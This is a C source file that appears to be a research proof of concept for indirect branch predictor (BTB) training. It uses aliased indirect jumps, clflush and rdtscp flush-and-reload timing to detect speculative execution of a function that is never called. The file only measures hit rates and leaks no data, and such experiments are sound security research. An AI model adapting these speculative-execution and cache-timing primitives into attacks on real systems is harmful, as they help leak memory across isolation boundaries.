#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <x86intrin.h>
#include <unistd.h>



//void funcfoo(void) __attribute__((section(".funcfoo")));
//void funcbar(void) __attribute__((section(".funcbar")));

unsigned int junk=0;

// Put this in its own (4KB) page
uint8_t probe_buf[4096*256];

uint8_t some_other_buf[4096*256];


// This one will actually be called (to train BTB)
void alias_target_fn(void) __attribute__((section(".aliastarget")));
void alias_target_fn(void)
{
    asm volatile ( "movb (%%rbx), %%al\n" :: "b"((uint8_t*)&some_other_buf[100*4096]) : "rax");

}

// This will never be called directly (but will happen speculatively)
void target_fn(void) __attribute__((section(".targetfn")));
void target_fn(void) {
    asm volatile ( "movb (%%rbx), %%al\n" :: "b"((uint8_t*)&probe_buf[100*4096]) : "rax");
}

// Keep stats
uint64_t cache_hits = 0;    // Basically number of times target_fn was speculatively executed
uint64_t tot_runs = 0;


void test() {
    uint64_t t0, t1;
    uint8_t *addr = &probe_buf[100*4096];
    t0 = _rdtscp(&junk);
    asm volatile( "movb (%%rbx), %%al\n"
            :: "b"(addr) : "rax");
    t1 = _rdtscp(&junk);
    if (t1-t0 < 140) {
        cache_hits++;
        //printf("# %lu\n", t1-t0);
    }
    tot_runs++;

    // Clear probe_buf from cache
    int i;
    for (i=0; i<256; i++) {
        _mm_clflush(&probe_buf[i*4096]);
    }
}

void __attribute__((section(".fnptr"))) (*fn_ptr)(void); // we'll set this = test, and cflush it
uint64_t jmp_offset;

void alias_indirect(void) __attribute__((section(".aliasindirect")));
void alias_indirect(void) {
    asm volatile (
            "jmp call_get_rip\n"
        "get_rip:\n"
            "pop %%rax\n" // rax = rip
            "push %%rax\n"
            "ret\n"
        "call_get_rip:\n"
            "call get_rip\n"
            // At this point, rip == rax
            "add (%%rbx), %%rax\n"
            "add $9, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            "add $6, %%rax\n"
            "jmpq *%%rax\n"
            :
            : "b"(&jmp_offset)
            : "rax");
            //*/
    (*fn_ptr)();
}


// Place this at the address of the function that will be doing an indirect call
// (measure)
void indirect(void) __attribute__((section(".indirect")));
void indirect(void) {
    // Do indirect jump
    (*fn_ptr)();
}


void measure() {
    fn_ptr = test;
    int i, j;
    while (1) {
        for (i=0; i<10000; i++) {
            for (j=0; j<100; j++) {
                fn_ptr = alias_target_fn;
                //fn_ptr = test;
                if (j == 95) {
                    fn_ptr = test;
                }
                _mm_clflush(&jmp_offset);
                _mm_clflush(fn_ptr);
                alias_indirect();
            }
            //usleep(1);
        }
        printf("%lu / %lu = %0.4f%% hits\n", cache_hits, tot_runs, 100*((float)cache_hits)/((float)tot_runs));
        cache_hits = 0;
        tot_runs = 0;
    }


}

void funcbar() {
    printf("hello from funcbar\n");
}

int main()
{
    uint64_t x;

    //printf("funcfoo = %p\n", funcfoo);
    //printf("funcfoo = %p\n", funcbar);

    jmp_offset = 0x00;
    fn_ptr = test;
    printf("indirect jump ptr = %p\n", fn_ptr);
    printf("indirect fn = %p\n", indirect);
    printf("alias indir = %p\n", alias_indirect);

    printf("target_fn = %p\n", target_fn);
    printf("alias tar = %p\n", alias_target_fn);

    printf("measuring...\n");

    measure();

    printf("[+] Success!\n");

    //funcfoo();
    //funcbar();
}
